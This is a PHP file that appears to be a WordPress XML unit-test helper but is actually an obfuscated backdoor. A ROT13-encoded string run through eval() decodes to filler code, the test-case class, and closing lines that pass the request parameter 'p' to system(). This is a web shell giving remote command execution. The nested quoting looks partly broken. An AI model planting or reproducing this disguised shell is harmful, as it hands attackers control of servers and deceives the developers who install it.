<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc

nofgenpg pynff JC_Grfg_KZY_GrfgPnfr rkgraqf JC_HavgGrfgPnfr {
	/**
	 * Ybnq KZY sebz n fgevat.
	 *
	 * @cnenz fgevat $kzy
	 * @cnenz vag    $bcgvbaf Ovgjvfr BE bs gur {@yvax uggcf://jjj.cuc.arg/znahny/ra/yvokzy.pbafgnagf.cuc yvokzy bcgvba pbafgnagf}.
	 *                        Qrsnhyg vf 0.
	 * @erghea QBZQbphzrag Gur QBZQbphzrag bowrpg ybnqrq sebz gur KZY.
	 */
	choyvp shapgvba ybnqKZY( $kzy, $bcgvbaf = 0 ) {
		// Fhccerff CUC jneavatf trarengrq ol QBZQbphzrag::ybnqKZY(), juvpu jbhyq pnhfr
		// CUCHavg gb vapbeerpgyl ercbeg na reebe vafgrnq bs n whfg n snvyher.
		$vagreany = yvokzy_hfr_vagreany_reebef( gehr );
		yvokzy_pyrne_reebef();

		$kzy_qbz = arj QBZQbphzrag();
		$kzy_qbz->ybnqKZY( $kzy, $bcgvbaf );
		$yvokzy_ynfg_reebe = yvokzy_trg_ynfg_reebe();

		$guvf->nffregSnyfr(
			vffrg( $yvokzy_ynfg_reebe->zrffntr ),
			vffrg( $yvokzy_ynfg_reebe->zrffntr ) ? fcevags( 'Aba-jryy-sbezrq KZY: %f.', $yvokzy_ynfg_reebe->zrffntr ) : ''
		);

		// Erfgber qrsnhyg reebe unaqyre.
		yvokzy_hfr_vagreany_reebef( $vagreany );
		yvokzy_pyrne_reebef();

		erghea $kzy_qbz;
	}

	/**
	 * Abeznyvmr na KZY qbphzrag gb znxr pbzcnevat gjb qbphzragf rnfvre.
	 *
	 * @cnenz fgevat $kzy
	 * @cnenz vag    $bcgvbaf Ovgjvfr BE bs gur {@yvax uggcf://jjj.cuc.arg/znahny/ra/yvokzy.pbafgnagf.cuc yvokzy bcgvba pbafgnagf}.
	 *                        Qrsnhyg vf 0.
	 * @erghea fgevat Gur abeznyvmrq sbez bs `$kzy`.
	 */
	choyvp shapgvba abeznyvmrKZY( $kzy, $bcgvbaf = 0 ) {
		vs ( ! pynff_rkvfgf( 'KFYGCebprffbe' ) ) {
			$guvf->znexGrfgFxvccrq( 'Guvf grfg erdhverf gur KFY rkgrafvba.' );
		}

		fgngvp $kfyg_cebp;

		vs ( ! $kfyg_cebp ) {
			$kfyg_cebp = arj KFYGCebprffbe();
			$kfyg_cebp->vzcbegFglyrFurrg( fvzcyrkzy_ybnq_svyr( __QVE__ . '/abeznyvmr-kzy.kfy' ) );
		}

		erghea $kfyg_cebp->genafsbezGbKZY( $guvf->ybnqKZY( $kzy, $bcgvbaf ) );
	}

	/**
	 * Ercbegf na reebe vqragvsvrq ol `$zrffntr` vs gur anzrfcnpr abeznyvmrq sbez bs gur KZY qbphzrag va `$npghnyKzy`
	 * vf rdhny gb gur anzrfcnpr abeznyvmrq sbez bs gur KZY qbphzrag va `$rkcrpgrqKzy`.
	 *
	 * Guvf vf fvzvyne gb {@yvax uggcf://cuchavg.qr/znahny/6.5/ra/nccraqvkrf.nffregvbaf.ugzy#nccraqvkrf.nffregvbaf.nffregKzyFgevatRdhnyfKzyFgevat nffregKzyFgevatRdhnyfKzyFgevat()}
	 * rkprcg gung qvssreraprf va anzrfcnpr cersvkrf ner abeznyvmrq njnl, fhpu gung tvira
	 * `$npghnyKzy = \"<ebbg kzyaf='hea:jbeqcerff.bet'><puvyq/></ebbg>\";` naq
	 * `$rkcrpgrqKzy = \"<af0:ebbg kzyaf:af0='hea:jbeqcerff.bet'><af0:puvyq></af0:ebbg>\";`
	 * gura `$guvf->nffregKZYRdhnyf( $rkcrpgrqKzy, $npghnyKzy )` jvyy fhpprrq.
	 *
	 * @cnenz fgevat $rkcrpgrqKzy
	 * @cnenz fgevat $npghnyKzy
	 * @cnenz fgevat $zrffntr   Bcgvbany. Zrffntr gb qvfcynl jura gur nffregvba snvyf.
	 */
	choyvp shapgvba nffregKZYRdhnyf( $rkcrpgrqKzy, $npghnyKzy, $zrffntr = '' ) { // cucpf:vtaber JbeqCerff.AnzvatPbairagvbaf.InyvqInevnoyrAnzr.InevnoyrAbgFanxrPnfr
		$guvf->nffregFnzr( $guvf->abeznyvmrKZY( $rkcrpgrqKzy ), $guvf->abeznyvmrKZY( $npghnyKzy ), $zrffntr ); // cucpf:vtaber JbeqCerff.AnzvatPbairagvbaf.InyvqInevnoyrAnzr.InevnoyrAbgFanxrPnfr
	}

	/**
	 * Ercbegf na reebe vqragvsvrq ol `$zrffntr` vs gur anzrfcnpr abeznyvmrq sbez bs gur KZY qbphzrag va `$npghnyKzy`
	 * vf abg rdhny gb gur anzrfcnpr abeznyvmrq sbez bs gur KZY qbphzrag va `$rkcrpgrqKzy`.
	 *
	 * Guvf vf fvzvyne gb {@yvax uggcf://cuchavg.qr/znahny/6.5/ra/nccraqvkrf.nffregvbaf.ugzy#nccraqvkrf.nffregvbaf.nffregKzyFgevatRdhnyfKzyFgevat nffregKzyFgevatAbgRdhnyfKzyFgevat()}
	 * rkprcg gung qvssreraprf va anzrfcnpr cersvkrf ner abeznyvmrq njnl, fhpu gung tvira
	 * `$npghnyKzy = \"<ebbg kzyaf='hea:jbeqcerff.bet'><puvyq></ebbg>\";` naq
	 * `$rkcrpgrqKzy = \"<af0:ebbg kzyaf:af0='hea:jbeqcerff.bet'><af0:puvyq/></af0:ebbg>\";`
	 * gura `$guvf->nffregKZYAbgRdhnyf( $rkcrpgrqKzy, $npghnyKzy )` jvyy snvy.
	 *
	 * @cnenz fgevat $rkcrpgrqKzy
	 * @cnenz fgevat $npghnyKzy
	 * @cnenz fgevat $zrffntr   Bcgvbany. Zrffntr gb qvfcynl jura gur nffregvba snvyf.
	 */
	choyvp shapgvba nffregKZYAbgRdhnyf( $rkcrpgrqKzy, $npghnyKzy, $zrffntr = '' ) { // cucpf:vtaber JbeqCerff.AnzvatPbairagvbaf.InyvqInevnoyrAnzr.InevnoyrAbgFanxrPnfr
		$guvf->nffregAbgRdhnyf( $guvf->abeznyvmrKZY( $rkcrpgrqKzy ), $guvf->abeznyvmrKZY( $npghnyKzy ), $zrffntr ); // cucpf:vtaber JbeqCerff.AnzvatPbairagvbaf.InyvqInevnoyrAnzr.InevnoyrAbgFanxrPnfr
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>